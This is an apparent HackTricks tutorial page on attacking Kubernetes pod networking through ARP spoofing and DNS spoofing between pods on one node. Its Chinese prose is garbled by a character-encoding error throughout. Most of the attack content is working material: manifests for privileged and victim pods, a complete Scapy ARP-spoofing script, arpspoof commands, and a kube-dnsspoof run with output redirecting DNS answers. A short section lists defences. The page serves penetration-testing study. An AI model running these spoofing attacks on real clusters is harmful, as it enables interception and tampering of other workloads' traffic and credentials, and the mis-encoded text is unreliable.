# Kubernetesç½‘ç»œæ”»å‡»

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ä»‹ç»

Kubernetesé»˜è®¤æƒ…å†µä¸‹ä¼šå°†**åœ¨åŒä¸€èŠ‚ç‚¹ä¸Šè¿è¡Œçš„æ‰€æœ‰å®¹å™¨**ï¼ˆå³ä½¿å®ƒä»¬å±äºä¸åŒçš„å‘½åç©ºé—´ï¼‰è¿æ¥åˆ°**ç¬¬2å±‚**ï¼ˆä»¥å¤ªç½‘ï¼‰ã€‚è¿™ä½¿å¾—æ¶æ„å®¹å™¨å¯ä»¥å¯¹åŒä¸€èŠ‚ç‚¹ä¸Šçš„å®¹å™¨è¿›è¡Œ**ARPæ¬ºéª—æ”»å‡»**å¹¶æ•è·å…¶æµé‡ã€‚

åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œå°†åˆ›å»º4å°æœºå™¨ï¼š

* ubuntu-peï¼šç‰¹æƒæœºå™¨ï¼Œç”¨äºé€ƒé€¸åˆ°èŠ‚ç‚¹å¹¶æ£€æŸ¥æŒ‡æ ‡ï¼ˆæ”»å‡»ä¸éœ€è¦ï¼‰
* **ubuntu-attack**ï¼šé»˜è®¤å‘½åç©ºé—´ä¸­çš„**æ¶æ„**å®¹å™¨
* **ubuntu-victim**ï¼škube-systemå‘½åç©ºé—´ä¸­çš„**å—å®³è€…**æœºå™¨
* **mysql**ï¼šé»˜è®¤å‘½åç©ºé—´ä¸­çš„**å—å®³è€…**æœºå™¨
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## åŸºæœ¬çš„Kubernetesç½‘ç»œ

å¦‚æœæ‚¨æƒ³äº†è§£æ›´å¤šå…³äºè¿™é‡Œä»‹ç»çš„ç½‘ç»œä¸»é¢˜çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚è€ƒå‚è€ƒèµ„æ–™ã€‚

### ARP

ä¸€èˆ¬æ¥è¯´ï¼Œ**èŠ‚ç‚¹å†…çš„Podä¹‹é—´çš„ç½‘ç»œ**å¯ä»¥é€šè¿‡ä¸€ä¸ªè¿æ¥æ‰€æœ‰Podçš„**æ¡¥æ¥å™¨**æ¥å®ç°ã€‚è¿™ä¸ªæ¡¥æ¥å™¨è¢«ç§°ä¸ºâ€œ**cbr0**â€ã€‚ï¼ˆæŸäº›ç½‘ç»œæ’ä»¶ä¼šå®‰è£…è‡ªå·±çš„æ¡¥æ¥å™¨ã€‚ï¼‰**cbr0ä¹Ÿå¯ä»¥å¤„ç†ARP**ï¼ˆåœ°å€è§£æåè®®ï¼‰è§£æã€‚å½“ä¸€ä¸ªä¼ å…¥çš„æ•°æ®åŒ…åˆ°è¾¾cbr0æ—¶ï¼Œå®ƒå¯ä»¥ä½¿ç”¨ARPè§£æç›®æ ‡MACåœ°å€ã€‚

è¿™ä¸ªäº‹å®æ„å‘³ç€ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ**åœ¨åŒä¸€ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œçš„æ¯ä¸ªPod**éƒ½å¯ä»¥ä»¥ä»¥å¤ªç½‘å±‚ï¼ˆç¬¬2å±‚ï¼‰çš„æ–¹å¼ä¸åŒä¸€èŠ‚ç‚¹ä¸­çš„ä»»ä½•å…¶ä»–Podè¿›è¡Œé€šä¿¡ï¼ˆä¸å‘½åç©ºé—´æ— å…³ï¼‰ã€‚

{% hint style="warning" %}
å› æ­¤ï¼Œ**åœ¨åŒä¸€èŠ‚ç‚¹çš„Podä¹‹é—´å¯ä»¥è¿›è¡ŒARPæ¬ºéª—æ”»å‡»**ã€‚
{% endhint %}

### DNS

åœ¨Kubernetesç¯å¢ƒä¸­ï¼Œé€šå¸¸ä¼šåœ¨kube-systemå‘½åç©ºé—´ä¸­è¿è¡Œ1ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰**DNSæœåŠ¡**ï¼š
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
åœ¨å‰é¢çš„ä¿¡æ¯ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°ä¸€äº›æœ‰è¶£çš„å†…å®¹ï¼Œ**æœåŠ¡çš„IPåœ°å€**æ˜¯**10.96.0.10**ï¼Œä½†è¿è¡Œè¯¥æœåŠ¡çš„**Podçš„IPåœ°å€**æ˜¯**172.17.0.2**ã€‚

å¦‚æœä½ æ£€æŸ¥ä»»ä½•Podå†…éƒ¨çš„DNSåœ°å€ï¼Œä½ ä¼šå‘ç°ç±»ä¼¼ä»¥ä¸‹å†…å®¹ï¼š
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
ç„¶è€Œï¼Œè¯¥pod**ä¸çŸ¥é“**å¦‚ä½•è®¿é—®è¯¥**åœ°å€**ï¼Œå› ä¸ºæ­¤æƒ…å†µä¸‹çš„podèŒƒå›´æ˜¯172.17.0.10/26ã€‚

å› æ­¤ï¼Œè¯¥podå°†å‘é€**DNSè¯·æ±‚åˆ°åœ°å€10.96.0.10**ï¼Œè¯¥åœ°å€å°†ç”±cbr0**è½¬æ¢ä¸º**172.17.0.2ã€‚

{% hint style="warning" %}
è¿™æ„å‘³ç€ï¼Œå³ä½¿DNSæœåŠ¡å™¨ä½äºä¸podç›¸åŒçš„å­ç½‘ä¸­ï¼Œpodçš„**DNSè¯·æ±‚**ä¹Ÿå°†å§‹ç»ˆé€šè¿‡**æ¡¥æ¥**æ¥**è½¬æ¢**æœåŠ¡IPä¸ºç«¯ç‚¹IPã€‚

äº†è§£åˆ°è¿™ä¸€ç‚¹ï¼Œå¹¶ä¸”çŸ¥é“**ARPæ”»å‡»æ˜¯å¯èƒ½çš„**ï¼ŒèŠ‚ç‚¹ä¸­çš„**pod**å°†èƒ½å¤Ÿ**æ‹¦æˆªå­ç½‘ä¸­æ¯ä¸ªpod**ä¸**æ¡¥æ¥**ä¹‹é—´çš„æµé‡ï¼Œå¹¶**ä¿®æ”¹**æ¥è‡ªDNSæœåŠ¡å™¨çš„**DNSå“åº”**ï¼ˆDNSæ¬ºéª—ï¼‰ã€‚

æ­¤å¤–ï¼Œå¦‚æœ**DNSæœåŠ¡å™¨**ä½äº**æ”»å‡»è€…æ‰€åœ¨çš„èŠ‚ç‚¹**ä¸Šï¼Œæ”»å‡»è€…å¯ä»¥**æ‹¦æˆªé›†ç¾¤ä¸­ä»»ä½•podçš„æ‰€æœ‰DNSè¯·æ±‚**ï¼ˆåœ¨DNSæœåŠ¡å™¨å’Œæ¡¥æ¥ä¹‹é—´ï¼‰å¹¶ä¿®æ”¹å“åº”ã€‚
{% endhint %}

## åœ¨åŒä¸€èŠ‚ç‚¹çš„podä¸­è¿›è¡ŒARPæ¬ºéª—

æˆ‘ä»¬çš„ç›®æ ‡æ˜¯**è‡³å°‘çªƒå–ubuntu-victimåˆ°mysqlçš„é€šä¿¡**ã€‚

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof

ARPSpoofæ˜¯ä¸€ç§ç½‘ç»œæ”»å‡»æŠ€æœ¯ï¼Œå®ƒåˆ©ç”¨ARPåè®®çš„æ¼æ´æ¥æ¬ºéª—ç½‘ç»œä¸­çš„ä¸»æœºã€‚é€šè¿‡å‘é€è™šå‡çš„ARPå“åº”ï¼Œæ”»å‡»è€…å¯ä»¥å°†è‡ªå·±ä¼ªè£…æˆç½‘ç»œä¸­çš„å…¶ä»–ä¸»æœºï¼Œä»è€Œæˆªå–æˆ–ç¯¡æ”¹ç½‘ç»œæµé‡ã€‚

#### æ”»å‡»åŸç†

ARPï¼ˆAddress Resolution Protocolï¼‰æ˜¯ä¸€ç§ç”¨äºå°†IPåœ°å€æ˜ å°„åˆ°ç‰©ç†MACåœ°å€çš„åè®®ã€‚åœ¨ä¸€ä¸ªå±€åŸŸç½‘ä¸­ï¼Œä¸»æœºä¹‹é—´é€šä¿¡æ—¶éœ€è¦çŸ¥é“ç›®æ ‡ä¸»æœºçš„MACåœ°å€ã€‚ä¸ºäº†è·å–ç›®æ ‡ä¸»æœºçš„MACåœ°å€ï¼Œå‘é€æ–¹ä¸»æœºä¼šå‘é€ä¸€ä¸ªARPè¯·æ±‚å¹¿æ’­ï¼Œè¯¢é—®ç›®æ ‡ä¸»æœºçš„MACåœ°å€ã€‚ç›®æ ‡ä¸»æœºæ”¶åˆ°è¯·æ±‚åï¼Œä¼šå‘é€ä¸€ä¸ªARPå“åº”ï¼ŒåŒ…å«è‡ªå·±çš„MACåœ°å€ã€‚

ARPSpoofæ”»å‡»åˆ©ç”¨äº†ARPåè®®çš„è¿™ä¸ªè¿‡ç¨‹ä¸­çš„æ¼æ´ã€‚æ”»å‡»è€…å‘é€è™šå‡çš„ARPå“åº”ï¼Œæ¬ºéª—å‘é€æ–¹ä¸»æœºå°†å…¶MACåœ°å€ä¸ç›®æ ‡ä¸»æœºçš„IPåœ°å€è¿›è¡Œæ˜ å°„ã€‚è¿™æ ·ï¼Œå‘é€æ–¹ä¸»æœºä¼šå°†æ‰€æœ‰å‘é€ç»™ç›®æ ‡ä¸»æœºçš„æµé‡å‘é€åˆ°æ”»å‡»è€…çš„æœºå™¨ä¸Šã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æˆªå–æˆ–ç¯¡æ”¹ç½‘ç»œæµé‡ã€‚

#### æ”»å‡»æ­¥éª¤

1. å¯ç”¨IPè½¬å‘ï¼šåœ¨æ”»å‡»è€…çš„æœºå™¨ä¸Šï¼Œéœ€è¦å¯ç”¨IPè½¬å‘åŠŸèƒ½ï¼Œä»¥ä¾¿å°†æµé‡è½¬å‘åˆ°æ­£ç¡®çš„ç›®æ ‡ä¸»æœºã€‚

2. æ¬ºéª—ç›®æ ‡ä¸»æœºï¼šæ”»å‡»è€…å‘é€è™šå‡çš„ARPå“åº”ï¼Œå°†è‡ªå·±çš„MACåœ°å€ä¸ç›®æ ‡ä¸»æœºçš„IPåœ°å€è¿›è¡Œæ˜ å°„ã€‚

3. æ¬ºéª—å‘é€æ–¹ä¸»æœºï¼šæ”»å‡»è€…å‘é€è™šå‡çš„ARPå“åº”ï¼Œå°†è‡ªå·±çš„MACåœ°å€ä¸å‘é€æ–¹ä¸»æœºçš„IPåœ°å€è¿›è¡Œæ˜ å°„ã€‚

4. æ•è·æµé‡ï¼šæ”»å‡»è€…çš„æœºå™¨ä¸Šä¼šæ”¶åˆ°å‘é€ç»™ç›®æ ‡ä¸»æœºçš„æ‰€æœ‰æµé‡ã€‚

#### é˜²å¾¡æªæ–½

è¦é˜²æ­¢ARPSpoofæ”»å‡»ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

- ä½¿ç”¨é™æ€ARPè¡¨ï¼šåœ¨ç½‘ç»œä¸­é…ç½®é™æ€ARPè¡¨ï¼Œå°†IPåœ°å€ä¸MACåœ°å€è¿›è¡Œç»‘å®šï¼Œé˜²æ­¢æ”»å‡»è€…å‘é€è™šå‡çš„ARPå“åº”ã€‚

- ä½¿ç”¨ARPé˜²ç«å¢™ï¼šé…ç½®ARPé˜²ç«å¢™ï¼Œåªå…è®¸å·²çŸ¥çš„MACåœ°å€ä¸IPåœ°å€è¿›è¡Œé€šä¿¡ã€‚

- ä½¿ç”¨åŠ å¯†é€šä¿¡ï¼šä½¿ç”¨åŠ å¯†åè®®ï¼ˆå¦‚HTTPSï¼‰æ¥ä¿æŠ¤ç½‘ç»œæµé‡ï¼Œé˜²æ­¢è¢«æˆªå–æˆ–ç¯¡æ”¹ã€‚

- ç›‘æ§ç½‘ç»œæµé‡ï¼šå®šæœŸç›‘æ§ç½‘ç»œæµé‡ï¼Œæ£€æµ‹å¼‚å¸¸çš„ARPè¯·æ±‚å’Œå“åº”ã€‚

- æ›´æ–°æ“ä½œç³»ç»Ÿå’Œç½‘ç»œè®¾å¤‡ï¼šåŠæ—¶æ›´æ–°æ“ä½œç³»ç»Ÿå’Œç½‘ç»œè®¾å¤‡çš„è¡¥ä¸ï¼Œä¿®å¤å·²çŸ¥çš„ARPæ¼æ´ã€‚

ARPSpoofæ”»å‡»æ˜¯ä¸€ç§å¸¸è§çš„ç½‘ç»œæ”»å‡»æŠ€æœ¯ï¼Œäº†è§£å…¶åŸç†å’Œé˜²å¾¡æªæ–½å¯¹äºä¿æŠ¤ç½‘ç»œå®‰å…¨è‡³å…³é‡è¦ã€‚
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNSæ¬ºéª—

æ­£å¦‚ä¹‹å‰æåˆ°çš„ï¼Œå¦‚æœä½ **å…¥ä¾µäº†ä¸DNSæœåŠ¡å™¨Podç›¸åŒèŠ‚ç‚¹çš„Pod**ï¼Œä½ å¯ä»¥é€šè¿‡**ARPæ¬ºéª—**æ¥**ä¸­é—´äººæ”»å‡»**æ¡¥æ¥å’ŒDNS Podï¼Œå¹¶**ä¿®æ”¹æ‰€æœ‰çš„DNSå“åº”**ã€‚

ä½ å¯ä»¥åœ¨[**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)æ‰¾åˆ°ä¸€ä¸ªéå¸¸å¥½çš„**å·¥å…·**å’Œ**æ•™ç¨‹**æ¥æµ‹è¯•è¿™ä¸ªæ”»å‡»ã€‚

åœ¨æˆ‘ä»¬çš„åœºæ™¯ä¸­ï¼Œ**ä¸‹è½½**è¿™ä¸ª**å·¥å…·**åˆ°æ”»å‡»è€…çš„Podä¸­ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªåä¸º`hosts`çš„æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä½ æƒ³è¦**æ¬ºéª—**çš„**åŸŸå**ï¼Œä¾‹å¦‚ï¼š
```
cat hosts
google.com. 1.1.1.1
```
æ‰§è¡Œå¯¹ubuntu-victimæœºå™¨çš„æ”»å‡»ï¼š
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
å¦‚æœæ‚¨å°è¯•åˆ›å»ºè‡ªå·±çš„DNSæ¬ºéª—è„šæœ¬ï¼Œå¦‚æœ**ä»…ä¿®æ”¹DNSå“åº”**ï¼Œé‚£æ˜¯**è¡Œä¸é€šçš„**ï¼Œå› ä¸º**å“åº”**å°†å…·æœ‰æ¶æ„**pod**çš„IPåœ°å€ï¼Œè€Œä¸ä¼šè¢«æ¥å—ã€‚\
æ‚¨éœ€è¦ç”Ÿæˆä¸€ä¸ªå…·æœ‰å—å®³è€…å‘é€DNSè¯·æ±‚çš„DNSçš„**æºIP**çš„**æ–°DNSæ•°æ®åŒ…**ï¼ˆç±»ä¼¼äº172.16.0.2ï¼Œè€Œä¸æ˜¯10.96.0.10ï¼Œè¿™æ˜¯K8s DNSæœåŠ¡IPè€Œä¸æ˜¯DNSæœåŠ¡å™¨IPï¼Œæœ‰å…³æ­¤å†…å®¹çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§ä»‹ç»ï¼‰ã€‚
{% endhint %}

## æ•è·æµé‡

å·¥å…·[**Mizu**](https://github.com/up9inc/mizu)æ˜¯ä¸€ä¸ªç®€å•è€Œå¼ºå¤§çš„ç”¨äºKubernetesçš„APIæµé‡æŸ¥çœ‹å™¨ï¼Œå¯ä»¥å¸®åŠ©æ‚¨æŸ¥çœ‹å¾®æœåŠ¡ä¹‹é—´çš„æ‰€æœ‰APIé€šä¿¡ï¼Œä»¥å¸®åŠ©æ‚¨è°ƒè¯•å’Œæ’æŸ¥å›å½’é—®é¢˜ã€‚\
å®ƒå°†åœ¨æ‰€é€‰çš„podä¸­å®‰è£…ä»£ç†å¹¶æ”¶é›†å…¶æµé‡ä¿¡æ¯ï¼Œå¹¶åœ¨WebæœåŠ¡å™¨ä¸­æ˜¾ç¤ºç»™æ‚¨ã€‚ä½†æ˜¯ï¼Œæ‚¨éœ€è¦é«˜çº§K8sæƒé™ï¼ˆè€Œä¸”å®ƒä¸å¤ªéšè”½ï¼‰ã€‚

## å‚è€ƒèµ„æ–™

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨å¸Œæœ›åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
